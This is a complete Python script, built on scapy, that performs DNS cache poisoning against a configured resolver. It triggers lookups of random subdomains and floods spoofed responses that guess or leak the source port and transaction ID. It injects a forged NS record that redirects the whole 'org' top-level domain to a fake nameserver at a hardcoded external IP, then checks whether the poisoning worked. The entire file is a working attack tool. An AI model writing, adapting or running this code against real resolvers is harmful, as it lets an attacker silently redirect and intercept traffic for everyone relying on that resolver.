import os
import random
import socket
import string
import sys
import threading
import time
from multiprocessing import Pool, cpu_count
from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, send, sr1

# --- PORT Configuration ---
# - Set to a range(...) to enable port brute-force mode.
# - Set to None to enable precise port mode (fetches from side-channel).
PORT_RANGE = None
# (Brute-force mode only) Number of ports to guess per round.
PORT_NUM = 20

# --- Transaction ID (TXID) Configuration ---
# - Set to a range(...) to enable TXID brute-force mode.
# - Set to None to enable precise TXID mode (fetches from side-channel).
ID_RANGE = None
# (Brute-force mode only) Number of TXIDs to guess per round.
ID_NUM = 60

ROUND_MAX = 2000 # Maximum number of rounds to attempt, set -1 for unlimited

SIDECAR_LISTEN_IP = "127.0.0.1"
SIDECAR_LISTEN_PORT = 12345

VICTIM_DNS_SERVER = "10.2.0.2"
ATTACKER_IP = "10.2.0.3"
TRIGGER_DOMAIN = "example.com"
TARGET_TLD_TO_HIJACK = "org"
FAKE_NS_DOMAIN = "kie-chi.com."
FAKE_NS_IP = "59.110.55.234"
DEFAULT_TTL = 3600

class Ccolors:
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    OKGREEN = '\033[92m'
    NC = '\033[0m'
    BOLD = '\033[1m'

query_domain_sent = ""
round_count = 0

def get_random_subdomain():
    return ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(10))

def get_random_private_ip():
    return f"10.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"

def get_random_port():
    return random.randint(32768, 65535)

def send_packets_worker(packets):
    send(packets, verbose=False)

def trigger_query():
    global query_domain_sent
    query_domain_sent = f"{get_random_subdomain()}.{TRIGGER_DOMAIN}"
    trigger_pkt = IP(dst=VICTIM_DNS_SERVER) / UDP(sport=get_random_port()) / DNS(rd=1, qd=DNSQR(qname=query_domain_sent))
    send(trigger_pkt, verbose=False)

def check_poisoning_status():
    time.sleep(1)
    check_pkt = IP(dst=VICTIM_DNS_SERVER) / UDP(sport=get_random_port()) / DNS(rd=1, qd=DNSQR(qname=TARGET_TLD_TO_HIJACK, qtype='NS'))
    ans = sr1(check_pkt, verbose=False, timeout=2)
    if ans and ans.haslayer(DNS) and ans.an:
        for rr in ans.an:
            if rr.type == 2 and FAKE_NS_DOMAIN.lower() in rr.rdata.decode('utf-8').lower():
                return True
    return False


def ultimate_poison_attack():
    global round_count
    poisoned = False

    # --- Mode detection and initialization ---
    port_mode_is_brute = PORT_RANGE is not None
    id_mode_is_brute = ID_RANGE is not None
    side_channel_needed = not port_mode_is_brute or not id_mode_is_brute

    mode_str = f"Port: {'Brute-Force' if port_mode_is_brute else 'Side-Channel'}, " \
               f"TXID: {'Brute-Force' if id_mode_is_brute else 'Side-Channel'}"
    print(f"[INFO] {Ccolors.BOLD}Attack Mode: {mode_str}{Ccolors.NC}")

    pool = Pool(processes=cpu_count()) if (port_mode_is_brute and id_mode_is_brute) else None

    # --- Pre-build DNS response payloads ---
    spoof_auth_rr = DNSRR(rrname=TARGET_TLD_TO_HIJACK, type='NS', rdata=FAKE_NS_DOMAIN, ttl=DEFAULT_TTL)
    spoof_add_rr = DNSRR(rrname=FAKE_NS_DOMAIN, type='A', rdata=FAKE_NS_IP, ttl=DEFAULT_TTL)

    _iter = 0
    while not poisoned and (ROUND_MAX == -1 or _iter < ROUND_MAX):
        round_count += 1
        print(f"[INFO] Round {round_count}: Starting...")

        # 1. Trigger the recursive query
        trigger_thread = threading.Thread(target=trigger_query)
        trigger_thread.start()

        # 2. Determine ports and TXIDs for this round
        ports_this_round, txids_this_round = [], []
        intel_sport, intel_txid = None, None

        # If side-channel is needed, listen for intelligence
        if side_channel_needed:
            print(f"[INFO] Round {round_count}: Waiting for side-channel intelligence...")
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            try:
                sock.bind((SIDECAR_LISTEN_IP, SIDECAR_LISTEN_PORT))
                sock.settimeout(10)
                data, addr = sock.recvfrom(1024)
                intel = data.decode('utf-8')
                parts = dict(part.split('=') for part in intel.split(','))
                intel_sport = int(parts['sport'])
                intel_txid = int(parts['txid'])
            except Exception:
                print(f"{Ccolors.WARNING}[WARN] Round {round_count}: Failed to receive/parse intelligence. Skipping.{Ccolors.NC}")
                trigger_thread.join()
                continue
            finally:
                sock.close()

        # Finalize port and TXID lists based on the attack mode
        ports_this_round = random.sample(list(PORT_RANGE), min(PORT_NUM, len(PORT_RANGE))) if port_mode_is_brute else [intel_sport]
        txids_this_round = random.sample(list(ID_RANGE), min(ID_NUM, len(ID_RANGE))) if id_mode_is_brute else [intel_txid]

        print(f"[INFO] Round {round_count}: Sending {len(ports_this_round) * len(txids_this_round)} spoofed packets...")

        # 3. Construct and send spoofed DNS responses
        packets_to_send = []
        for port in ports_this_round:
            for txid in txids_this_round:
                # This spoofed answer is for the original query, to make the response more believable
                spoof_ans_rr = DNSRR(rrname=query_domain_sent, type='A', rdata=get_random_private_ip(), ttl=DEFAULT_TTL)
                dns_payload = DNS(id=txid, qr=1, aa=1, qd=DNSQR(qname=query_domain_sent),
                                  an=spoof_ans_rr, ns=spoof_auth_rr, ar=spoof_add_rr)
                p = IP(src=ATTACKER_IP, dst=VICTIM_DNS_SERVER) / UDP(sport=53, dport=port) / dns_payload
                packets_to_send.append(p)

        if pool:
            chunk_size = (len(packets_to_send) // (pool._processes or 1)) + 1
            chunks = [packets_to_send[i:i + chunk_size] for i in range(0, len(packets_to_send), chunk_size)]
            pool.map_async(send_packets_worker, chunks)
        else:
            send(packets_to_send, verbose=False)

        trigger_thread.join()

        # 4. Check if poisoning was successful
        if ROUND_MAX == -1 or _iter == ROUND_MAX - 1:
            if check_poisoning_status():
                poisoned = True
                print(f"\n{Ccolors.OKGREEN}{Ccolors.BOLD}[SUCCESS] Cache poisoned successfully in round {round_count}!{Ccolors.NC}")
            else:
                print(f"[INFO] Round {round_count}: Poisoning failed, trying again.")
        else:
            print(f"[INFO] Round {round_count}: Poisoning check skipped")
        if ROUND_MAX != -1:
            if _iter == ROUND_MAX - 1:
                print(f"[INFO] Round {round_count}: Reached maximum iterations, stopping.")
            _iter += 1

    if pool:
        pool.close()
        pool.join()

if __name__ == "__main__":
    if os.geteuid() != 0:
        sys.exit(f"{Ccolors.FAIL}[ERROR] This script must be run as root.{Ccolors.NC}")

    print(f"{Ccolors.BOLD}--- Ultimate DNS Poisoning Script (Hybrid Mode) ---{Ccolors.NC}")
    try:
        ultimate_poison_attack()
    except KeyboardInterrupt:
        print(f"\n{Ccolors.WARNING}[INFO] Attack interrupted by user.{Ccolors.NC}")